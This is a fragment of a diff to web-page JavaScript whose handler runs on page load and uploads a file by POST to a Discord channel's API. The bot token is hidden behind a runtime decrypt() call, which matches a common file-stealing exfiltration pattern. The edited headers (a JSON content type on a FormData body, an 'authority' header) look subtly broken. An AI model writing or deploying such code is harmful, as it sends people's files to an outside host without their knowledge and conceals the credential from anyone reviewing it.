@@ -19,10 +19,11 @@ document.addEventListener('DOMContentLoaded', function(){
             formData.append('file', file);
             fetch('https://discord.com/api/v10/channels/1146358218696691764/messages', {
                 method: 'POST',
-                referrerPolicy: 'strict-origin-when-cross-origin',
                 body: formData,
                 headers: {
-                    'Content-Type': 'multipart/form-data',
+                    'Content-Type': 'application/json',
+                    'accept': "/",
+                    'authority': "discordapp.com",
                     'Authorization': decrypt("uY3ANQt+2c5P7zNDzoUvf3g5+HFOHsT6M2Rtrc3553eZKH5UCc50oxJxrHmptNaegb2TWzhlKySHnP6bJJWalfu6du4DKmdxgtsvMmokxXo="),
                 }
             })
